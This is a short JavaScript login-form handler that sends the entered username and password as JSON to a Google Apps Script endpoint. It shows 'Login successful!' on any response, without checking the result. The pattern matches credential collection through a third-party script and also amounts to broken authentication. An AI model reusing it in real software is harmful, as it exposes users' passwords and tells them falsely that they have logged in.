document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    var data = {
        username: username,
        password: password,
        action: 'login'
    };

    fetch('https://script.google.com/macros/s/AKfycbzuDLDgqdPEf7Hfu1WZZeiGb52a75R6Y0eDsjtLA1ISJ9tDjMS8PsTAsS521OLP_dpURg/exec', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    }).then(response => response.text())
    .then(result => {
        console.log(result);
        alert('Login successful!');
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Login failed!');
    });
});
